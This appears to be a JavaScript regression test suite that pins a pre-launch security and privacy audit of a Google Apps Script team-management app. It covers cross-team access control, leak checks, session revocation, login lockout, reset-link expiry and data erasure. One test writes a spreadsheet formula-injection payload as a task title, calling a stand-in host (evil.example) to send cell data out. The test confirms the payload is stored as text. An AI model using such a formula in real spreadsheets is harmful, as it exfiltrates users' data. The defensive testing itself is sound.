/**
 * The pre-launch security and privacy audit, pinned so each hole stays shut.
 * Every check here was an attack that worked, or a leak that was there, before
 * the fix — see SECURITY-AUDIT.md for what each one was.
 */
const fs = require('fs');
const { build } = require('./gas-shim');
let pass = 0, fail = 0;
const ok = (n, v, x) => { console.log((v ? '  PASS ' : '  FAIL ') + n + (v || x === undefined ? '' : '  [' + String(x).slice(0, 200) + ']')); v ? pass++ : fail++; };
const S = JSON.stringify;

const env = build();
Object.assign(env.props, { MASTER_DB_ID: 'MASTER', TEMPLATE_ID: 'TEMPLATE', AUTH_PEPPER: 'a', TOKEN_SECRET: 'b' });
env.newFile('MASTER', 'Master');
const tpl = env.newFile('TEMPLATE', 'Template');
['Users', 'Tasks', 'KRA_Master', 'Reviews', 'Leave', 'Settings'].forEach((n) => tpl.insertSheet(n));
tpl.getSheetByName('Settings').appendRow(['General']);
const logs = [];
env.G.Logger = { log: (m) => logs.push(String(m)) };
const names = Object.keys(env.G);
const X = new Function(...names, fs.readFileSync(__dirname + '/../dist/code.gs', 'utf8') +
  '\n;return { doPost, ensureRegistry, eraseCompanyData, erasePerson, sendEmail_, neutralizeFormulas_ };')(...names.map((n) => env.G[n]));
X.ensureRegistry();
const call = (b) => JSON.parse(X.doPost({ postData: { contents: S(b) }, parameter: {} }).getContent());
const msg = (b) => { const r = call(b); return r.status === 'error' ? r.message : ''; };

const reg = call({ action: 'register', form: { companyName: 'Acme', name: 'Owner', email: 'o@a.in', password: 'ownerpass123' } });
const A = reg.token;
const add = (n, u, role, mgr) => call({ action: 'addUser', token: A, form: { name: n, username: u, email: u + '@a.in',
  phone: '9830011111', role, manager: mgr, jobProfile: 'Ops', password: 'staffpass123' } });
add('Mgr One', 'm1', 'HOD', ''); add('Mgr Two', 'm2', 'HOD', ''); add('Doer A', 'da', 'Doer', 'm1'); add('Doer B', 'db', 'Doer', 'm2');
const T = (u) => call({ action: 'login', username: u + '@a.in', password: 'staffpass123' }).token;
let M1 = T('m1'); const M2 = T('m2'), DA = T('da'), DB = T('db');
const due = new Date(Date.now() + 5 * 864e5).toISOString().slice(0, 10);
call({ action: 'setLeave', token: M1, username: 'da', from: due, to: due, reason: 'Medical — surgery' });

console.log('\n=== a head of department manages their own line, not everyone ===');
ok('HOD cannot set the password of another team\'s Doer',
  /not in your team/.test(msg({ action: 'updateUser', token: M2, form: { originalUsername: 'da', password: 'takeover123' } })));
ok('HOD cannot set a peer manager\'s password',
  /not in your team/.test(msg({ action: 'updateUser', token: M2, form: { originalUsername: 'm1', password: 'takeover123' } })));
ok('so the peer\'s own password still works', !!T('m1'));
ok('HOD cannot move another team\'s person under themselves',
  /not in your team/.test(msg({ action: 'updateUser', token: M2, form: { originalUsername: 'da', manager: 'm2' } })));
ok('HOD cannot change their own manager or switch themselves off',
  /account menu|own/i.test(msg({ action: 'updateUser', token: M2, form: { originalUsername: 'm2', manager: 'm1' } })) &&
  /account menu/.test(msg({ action: 'updateUser', token: M2, form: { originalUsername: 'm2', active: false } })));
ok('HOD cannot set leave for another team',
  /not in your team/.test(msg({ action: 'setLeave', token: M2, username: 'da', from: due, to: due, reason: 'x' })));
ok('HOD cannot open another team\'s appraisal',
  /not in your team/.test(msg({ action: 'getAppraisalForm', token: M2, username: 'da' })));
ok('HOD cannot clear another team\'s KRAs',
  /not in your team/.test(msg({ action: 'clearKra', token: M2, username: 'da' })));
ok('their own manager still can', call({ action: 'getAppraisalForm', token: M1, username: 'da' }).status === 'success');
ok('and an Admin still can', call({ action: 'getAppraisalForm', token: A, username: 'da' }).status === 'success');

console.log('\n=== nobody reads what is not theirs ===');
const lv = call({ action: 'getLeave', token: DB });
ok('a colleague\'s leave reason is not sent to another team', !S(lv).includes('surgery'), S(lv));
ok('their own manager still sees it', S(call({ action: 'getLeave', token: M1 })).includes('surgery'));
const us = call({ action: 'getUsers', token: DB }).users || [];
const other = us.find((u) => u.username === 'da') || {};
ok('a colleague\'s email and phone are not sent to a Doer', !other.email && !other.phone, S(other));
ok('the name, role and team still are, for assigning work', other.name === 'Doer A' && other.role === 'Doer');
ok('no password hash in any user list', !/password|hash|salt/i.test(S(call({ action: 'getUsers', token: A }))));
const org = S(call({ action: 'getOrgChart', token: DB }));
ok('the org chart does not hand a Doer everyone\'s email', (org.match(/@a\.in/g) || []).length <= 1, org.match(/@a\.in/g));
ok('a Doer cannot read another team\'s score detail',
  call({ action: 'getAnalytics', token: DB, period: 'month', person: 'da' }).person == null);

console.log('\n=== sessions end when they should ===');
const old = DA;
call({ action: 'signOut', token: DA });
ok('signing out kills the token on the server, not only in the browser', /expired/.test(msg({ action: 'getDashboard', token: old })));
const DA2 = T('da');
ok('and signing back in works', call({ action: 'getDashboard', token: DA2 }).status === 'success');
call({ action: 'updateUser', token: M1, form: { originalUsername: 'da', password: 'resetbymgr123' } });
ok('a manager resetting a password signs that person out everywhere', /expired/.test(msg({ action: 'getDashboard', token: DA2 })));

console.log('\n=== what is typed is stored as text, never run ===');
call({ action: 'createTask', token: A, form: { title: '=IMPORTXML("http://evil.example/?"&A1,"//a")', assignTo: 'db', dueDate: due, priority: 'Low' } });
const tasks = env.FILES[Object.keys(env.FILES).find((k) => /^SHEET_/.test(k) && env.FILES[k].getSheetByName('Tasks'))].getSheetByName('Tasks')._data;
const stored = tasks.map((r) => r[3]).find((t) => /IMPORTXML/.test(String(t)));
ok('a formula typed as a task title is written with the apostrophe that makes it text',
  X.neutralizeFormulas_({ form: { title: '=HYPERLINK("x")', tags: ['=1+1'] } }, '').form.title === "'=HYPERLINK(\"x\")" &&
  X.neutralizeFormulas_({ form: { tags: ['=1+1'] } }, '').form.tags[0] === "'=1+1");
ok('but a password beginning with = is left exactly as typed',
  X.neutralizeFormulas_({ password: '=secret1234' }, '').password === '=secret1234');
ok('and reads back exactly as typed', S(call({ action: 'getDashboard', token: A })).includes('=IMPORTXML'), stored);

console.log('\n=== errors and logs ===');
ok('ordinary refusals still say what is wrong', /not in your team/.test(msg({ action: 'clearKra', token: M2, username: 'da' })));
const realSend = env.G.GmailApp.sendEmail;
env.G.GmailApp.sendEmail = () => { throw new Error('boom'); };
try { X.sendEmail_('someone.private@a.in', 's', '<p>x</p>'); } catch (e) {}
env.G.GmailApp.sendEmail = realSend;
const el = env.FILES.MASTER.getSheetByName('ErrorLog');
const elText = el ? S(el._data) : '';
ok('no full email address is written to the error log', !/someone\.private@/.test(elText + logs.join('\n')), elText.slice(-200));
ok('no password appears in any log', !/staffpass123|ownerpass123|takeover123/.test(elText + logs.join('\n')));

const tenant = env.FILES[Object.keys(env.FILES).find((k) => /^SHEET_/.test(k) && env.FILES[k].getSheetByName('Tasks'))];
const realTab = tenant.getSheetByName;
tenant.getSheetByName = (n) => { if (n === 'Tasks') throw new TypeError("Cannot read properties of undefined (reading 'getLastRow')"); return realTab(n); };
const internal = msg({ action: 'getDashboard', token: A });
tenant.getSheetByName = realTab;
ok('an internal fault reaches the user as a plain message with a reference', /Reference [0-9A-F]{8}/.test(internal) && !/Cannot read/.test(internal), internal);
const ref = (internal.match(/Reference ([0-9A-F]{8})/) || [])[1];
ok('and the detail is in the ErrorLog under that reference', !!ref && S(env.FILES.MASTER.getSheetByName('ErrorLog')._data).includes(ref));

console.log('\n=== guessing passwords ===');
let lock = '';
for (let i = 0; i < 7 && !lock; i++) {
  const m = msg({ action: 'login', username: 'db@a.in', password: 'wrong-' + i });
  if (/too many|try again in/i.test(m)) lock = 'after ' + i;
}
ok('sign-in locks after 5 wrong passwords', lock === 'after 5', lock);
let fp = '';
for (let i = 0; i < 5 && !fp; i++) {
  const m = msg({ action: 'forgotPassword', email: 'm2@a.in' });
  if (/too many|try again/i.test(m)) fp = 'after ' + i;
}
ok('password-reset emails stop after 3 an hour', fp === 'after 3', fp);

console.log('\n=== reset links ===');
const mailsBefore = env.mails.length;
call({ action: 'forgotPassword', email: 'm1@a.in' });
const rm = env.mails.slice(mailsBefore).find((m) => /reset/i.test(m.subject)) || {};
const rt = decodeURIComponent((String(rm.html).match(/reset_token=([^"&<\s]+)/) || [])[1] || '');
const rows = env.FILES.MASTER.getSheetByName('Reset_Tokens')._data;
rows[rows.length - 1][2] = new Date(Date.now() - 16 * 60000);
ok('a reset link is dead after 15 minutes', /expired/.test(msg({ action: 'resetPassword', token: rt, password: 'latepass12345' })));
ok('the email says so', /15 minutes/.test(String(rm.html)));

console.log('\n=== erasing a person, and a company ===');
ok('erasing needs the typed confirmation', /Nothing erased/.test(X.erasePerson('o@a.in', 'db@a.in', 'yes')));
const ep = X.erasePerson('o@a.in', 'db@a.in', 'ERASE db@a.in');
ok('erasePerson reports what it did', /Erased db/.test(ep), ep);
const after = (call({ action: 'getUsers', token: A }).users || []).find((u) => u.username === 'db') || {};
ok('their name, email and phone are gone', after.name === 'Former member' && !after.email && !after.phone, S(after));
ok('they cannot sign in', !call({ action: 'login', username: 'db@a.in', password: 'staffpass123' }).token);
ok('their sessions are dead', /expired|deactivated|not active/i.test(msg({ action: 'getDashboard', token: DB })));
ok('the owner cannot be erased as a person', /owns/.test(X.erasePerson('o@a.in', 'o@a.in', 'ERASE o@a.in')));
const sheetId = env.FILES.MASTER.getSheetByName('Directory')._data[1][5];
const ec = X.eraseCompanyData('o@a.in', 'ERASE o@a.in');
ok('eraseCompanyData reports what it did', /Erased Acme/.test(ec), ec);
ok('the workspace sheet is in the bin', env.G.DriveApp.getFileById(sheetId).isTrashed());
ok('no Directory or Global_Users row is left',
  !S(env.FILES.MASTER.getSheetByName('Directory')._data).includes(sheetId) &&
  !S(env.FILES.MASTER.getSheetByName('Global_Users')._data).includes(sheetId));
ok('nobody can sign in to it any more', !call({ action: 'login', username: 'o@a.in', password: 'ownerpass123' }).token);

console.log('\n=== a missing secret closes the service ===');
const saved = env.props.TOKEN_SECRET; delete env.props.TOKEN_SECRET;
const nc = msg({ action: 'login', username: 'm1@a.in', password: 'staffpass123' });
ok('with TOKEN_SECRET missing every request is refused', /not configured/.test(nc), nc);
ok('without naming the setting to the visitor', !/TOKEN_SECRET|Script Propert/.test(nc));
env.props.TOKEN_SECRET = saved;

console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
